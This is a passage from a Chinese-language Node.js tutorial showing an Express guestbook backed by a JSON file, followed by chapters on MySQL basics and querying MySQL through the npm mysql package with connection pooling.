punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'./node_modules/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h6 id="六、将数据库中的-post-渲染到首页"><a href="#六、将数据库中的-post-渲染到首页" class="headerlink" title="六、将数据库中的 post 渲染到首页"></a>六、将数据库中的 post 渲染到首页</h6><p>JavaScript 后台处理：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./db.json'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        errMessage<span class="token punctuation">:</span> err<span class="token punctuation">.</span>message      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      data <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        posts<span class="token punctuation">:</span> data<span class="token punctuation">.</span>posts      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        errMessage<span class="token punctuation">:</span> err<span class="token punctuation">.</span>message      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>index.html 页面模板字符串：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  {{ each posts }}  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list-group-item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>{{ $value.time }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>{{ $value.name }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>说：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>{{ $value.content }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  {{ /each }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code></pre><h6 id="七、配置解析表单-post-请求体"><a href="#七、配置解析表单-post-请求体" class="headerlink" title="七、配置解析表单 post 请求体"></a>七、配置解析表单 post 请求体</h6><blockquote><p>参见：Express - 解析表单 post 请求体</p></blockquote><h6 id="八、处理-publish-表单提交"><a href="#八、处理-publish-表单提交" class="headerlink" title="八、处理 publish 表单提交"></a>八、处理 publish 表单提交</h6><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/publish'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> body <span class="token operator">=</span> req<span class="token punctuation">.</span>body  fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./db.json'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        errMessage<span class="token punctuation">:</span> err<span class="token punctuation">.</span>message      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      data <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> posts <span class="token operator">=</span> data<span class="token punctuation">.</span>posts      <span class="token keyword">var</span> last <span class="token operator">=</span> posts<span class="token punctuation">[</span>posts<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>      <span class="token comment" spellcheck="true">// 生成数据添加到 post 数组中</span>      posts<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        id<span class="token punctuation">:</span> last <span class="token operator">?</span> last<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        name<span class="token punctuation">:</span> body<span class="token punctuation">.</span>name<span class="token punctuation">,</span>        content<span class="token punctuation">:</span> body<span class="token punctuation">.</span>content<span class="token punctuation">,</span>        time<span class="token punctuation">:</span> <span class="token function">moment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'YYYY-MM-DD HH:mm:ss'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// moment 是一个专门用来处理时间的 JavaScript 库</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 把对象转成字符串存储到文件中</span>      <span class="token comment" spellcheck="true">// try-catch 无法捕获异步代码的异常</span>      fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'./db.json'</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            errMessage<span class="token punctuation">:</span> err<span class="token punctuation">.</span>message          <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 代码执行到这里，说明写入文件成功了</span>        <span class="token comment" spellcheck="true">// 在 Express 中，我们可以使用 res.redirect() 实现服务端重定向的功能</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        errMessage<span class="token punctuation">:</span> err<span class="token punctuation">.</span>message      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="九、案例优化：提取数据操作模块"><a href="#九、案例优化：提取数据操作模块" class="headerlink" title="九、案例优化：提取数据操作模块"></a>九、案例优化：提取数据操作模块</h6><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>readFile<span class="token punctuation">,</span> writeFile<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> dbPath <span class="token operator">=</span> <span class="token string">'./db.json'</span>exports<span class="token punctuation">.</span>getDb <span class="token operator">=</span> getDb<span class="token comment" spellcheck="true">// 封装带来的好处：</span><span class="token comment" spellcheck="true">//    1. 可维护性</span><span class="token comment" spellcheck="true">//    2. 其次才是重用</span>exports<span class="token punctuation">.</span>addPost <span class="token operator">=</span> <span class="token punctuation">(</span>post<span class="token punctuation">,</span> callback<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">getDb</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> dbData<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 获取数组中最后一个元素</span>    <span class="token keyword">const</span> last <span class="token operator">=</span> dbData<span class="token punctuation">.</span>posts<span class="token punctuation">[</span>dbData<span class="token punctuation">.</span>posts<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// 添加数据的 id 自动增长</span>    post<span class="token punctuation">.</span>id <span class="token operator">=</span> last <span class="token operator">?</span> last<span class="token punctuation">.</span>id <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true">// 创建时间</span>    post<span class="token punctuation">.</span>createdAt <span class="token operator">=</span> <span class="token string">'2018-2-2 11:57:06'</span>    <span class="token comment" spellcheck="true">// 将数据添加到数组中（这里还并没有持久化存储）</span>    dbData<span class="token punctuation">.</span>posts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 将 dbData 对象转成字符串持久化存储到文件中</span>    <span class="token keyword">const</span> dbDataStr <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>dbData<span class="token punctuation">)</span>    <span class="token function">writeFile</span><span class="token punctuation">(</span>dbPath<span class="token punctuation">,</span> dbDataStr<span class="token punctuation">,</span> err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// Express 为 res 响应对象提供了一个工具方法：redirect 可以便捷的重定向</span>      <span class="token comment" spellcheck="true">// res.redirect('/')</span>      <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> getDb <span class="token punctuation">(</span>callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">readFile</span><span class="token punctuation">(</span>dbPath<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h6 id="十、案例总结"><a href="#十、案例总结" class="headerlink" title="十、案例总结"></a>十、案例总结</h6><h2 id="第9章-数据库"><a href="#第9章-数据库" class="headerlink" title="第9章 数据库"></a>第9章 数据库</h2><p><strong>学习目标</strong></p><ul><li>理解数据库概念</li><li>创建数据库</li><li>创建数据表</li><li>增删改操作</li><li>查询操作</li></ul><h4 id="数据库入门"><a href="#数据库入门" class="headerlink" title="数据库入门"></a>数据库入门</h4><h6 id="数据库基础知识"><a href="#数据库基础知识" class="headerlink" title="数据库基础知识"></a>数据库基础知识</h6><h6 id="MySQL-安装与配置"><a href="#MySQL-安装与配置" class="headerlink" title="MySQL 安装与配置"></a>MySQL 安装与配置</h6><p>######## Windows</p><p>参考链接：</p><ul><li><a href="https://dev.mysql.com/doc/refman/8.0/en/mysql-installer.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/mysql-installer.html</a></li></ul><p>######## macOS</p><p><img src="/images/image-20181125015056630-3081856.png" alt="image-20181125015056630"></p><p><img src="/images/image-20181125015151524-3081911.png" alt="image-20181125015151524"></p><p><img src="/images/image-20181125015215072-3081935.png" alt="image-20181125015215072"></p><p><img src="/images/image-20181125015319951-3081999.png" alt="image-20181125015319951"></p><p><img src="/images/image-20181125015513934-3082113.png" alt="image-20181125015513934"></p><p><img src="/images/image-20181125015635130-3082195.png" alt="image-20181125015635130"></p><p><img src="/images/image-20181125015709088-3082229.png" alt="image-20181125015709088"></p><p>查看启动状态</p><p><img src="/images/image-20181125015818182-3082298.png" alt="image-20181125015818182"></p><p><img src="/images/image-20181125015834142-3082314.png" alt="image-20181125015834142"></p><p>参考链接：</p><ul><li><a href="https://dev.mysql.com/doc/refman/8.0/en/osx-installation-pkg.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/osx-installation-pkg.html</a></li></ul><p>######## Linux</p><p>参考链接：</p><ul><li><a href="https://dev.mysql.com/doc/refman/8.0/en/linux-installation.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/linux-installation.html</a></li></ul><h6 id="MySQL-目录结构"><a href="#MySQL-目录结构" class="headerlink" title="MySQL 目录结构"></a>MySQL 目录结构</h6><h6 id="MySQL-的使用"><a href="#MySQL-的使用" class="headerlink" title="MySQL 的使用"></a>MySQL 的使用</h6><h4 id="数据库和表的基本操作"><a href="#数据库和表的基本操作" class="headerlink" title="数据库和表的基本操作"></a>数据库和表的基本操作</h4><h6 id="数据库基础知识-1"><a href="#数据库基础知识-1" class="headerlink" title="数据库基础知识"></a>数据库基础知识</h6><h6 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h6><h6 id="数据表的基本操作"><a href="#数据表的基本操作" class="headerlink" title="数据表的基本操作"></a>数据表的基本操作</h6><h6 id="表的约束"><a href="#表的约束" class="headerlink" title="表的约束"></a>表的约束</h6><h4 id="添加、更新与删除数据"><a href="#添加、更新与删除数据" class="headerlink" title="添加、更新与删除数据"></a>添加、更新与删除数据</h4><h4 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h4><h4 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h4><h2 id="第10章-使用数据库存储网站数据"><a href="#第10章-使用数据库存储网站数据" class="headerlink" title="第10章 使用数据库存储网站数据"></a>第10章 使用数据库存储网站数据</h2><p><strong>学习目标</strong></p><ul><li>使用 mysql 包操作 MySQL 数据库</li><li>使用数据库的动态网站</li><li>基于数据库的网站（增删改查）</li></ul><h4 id="使用-mysql-包"><a href="#使用-mysql-包" class="headerlink" title="使用 mysql 包"></a>使用 mysql 包</h4><h6 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h6><pre class=" language-shell"><code class="language-shell">npm install mysql</code></pre><h6 id="Hello-World-1"><a href="#Hello-World-1" class="headerlink" title="Hello World"></a>Hello World</h6><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> mysql      <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> connection <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  host     <span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>  user     <span class="token punctuation">:</span> <span class="token string">'me'</span><span class="token punctuation">,</span>  password <span class="token punctuation">:</span> <span class="token string">'secret'</span><span class="token punctuation">,</span>  database <span class="token punctuation">:</span> <span class="token string">'my_db'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connection<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT 1 + 1 AS solution'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The solution is: '</span><span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>solution<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>connection<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h6 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h6><p>######## 查询</p><p>基本查询：</p><pre class=" language-javascript"><code class="language-javascript">connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT * FROM `books` WHERE `author` = "David"'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// error will be an Error if one occurred during the query</span>  <span class="token comment" spellcheck="true">// results will contain the results of the query</span>  <span class="token comment" spellcheck="true">// fields will contain information about the returned results fields (if any)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>条件查询：</p><pre class=" language-javascript"><code class="language-javascript">connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT * FROM `books` WHERE `author` = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'David'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// error will be an Error if one occurred during the query</span>  <span class="token comment" spellcheck="true">// results will contain the results of the query</span>  <span class="token comment" spellcheck="true">// fields will contain information about the returned results fields (if any)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>######## 添加</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> post  <span class="token operator">=</span> <span class="token punctuation">{</span>id<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'Hello MySQL'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> query <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO posts SET ?'</span><span class="token punctuation">,</span> post<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Neat!</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// INSERT INTO posts SET `id` = 1, `title` = 'Hello MySQL'</span></code></pre><p>######## 删除</p><pre class=" language-javascript"><code class="language-javascript">connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'DELETE FROM posts WHERE title = "wrong"'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'deleted '</span> <span class="token operator">+</span> results<span class="token punctuation">.</span>affectedRows <span class="token operator">+</span> <span class="token string">' rows'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>######## 修改</p><pre class=" language-javascript"><code class="language-javascript">connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'UPDATE users SET foo = ?, bar = ?, baz = ? WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> userId<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><hr><h6 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h6><p><img src="/images/connection-pool.png" alt="connection-pool.png"></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> mysql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> pool  <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createPool</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  host     <span class="token punctuation">:</span> <span class="token string">'example.org'</span><span class="token punctuation">,</span>  user     <span class="token punctuation">:</span> <span class="token string">'bob'</span><span class="token punctuation">,</span>  password <span class="token punctuation">:</span> <span class="token string">'secret'</span><span class="token punctuation">,</span>  database <span class="token punctuation">:</span> <span class="token string">'my_db'</span><span class="token punctuation">,</span>  connectionLimit<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token comment" spellcheck="true">// 默认是 10 个</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pool<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> connection<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Use the connection</span>  connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT something FROM sometable'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">,</span> results<span class="token punctuation">,</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 释放回连接池</span>    connection<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 处理错误</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">throw</span> error<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h6 id="封装-dbHelper-js"><a href="#封装-dbHelper-js" class="headerlink" title="封装 dbHelper.js"></a>封装 dbHelper.js</h6><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> mysql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span><span class="token keyword">const</span> pool <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createPool</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  host<span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>  user<span class="token punctuation">:</span> <span class="token string">'root'</span><span class="token punctuation">,</span>  password<span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>  database<span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>  connectionLimit<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token comment" spellcheck="true">// 默认是 10 个</span><span class="token punctuation">}</span><span class="token punctuation">)</span>exports<span class="token punctuation">.</span>query <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 从数组中弹出最后一个元素 callback 回调函数</span>  <span class="token keyword">const</span> callback <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  pool<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> connection<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token operator">...</span>results<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// ...results => [err, results, fields]</span>      <span class="token comment" spellcheck="true">// 释放回连接池</span>      connection<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 把 ...results => [err, results, fields] 展开调用 callback 继续往外抛</span>      <span class="token function">callback</span><span class="token punctuation">(</span><span class="token operator">...</span>results<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="结合数据库的网站"><a href="#结合数据库的网站" class="headerlink" title="结合数据库的网站"></a>结合数据库的网站</h4><h2 id="第11章-会话保持"><a href="#第11章-会话保持" class="headerlink" title="第11章 会话保持"></a>第11章 会话保持</h2><p><strong>学习目标</strong></p><ul><li>理解会话保持概念</li><li>理解 Cookie 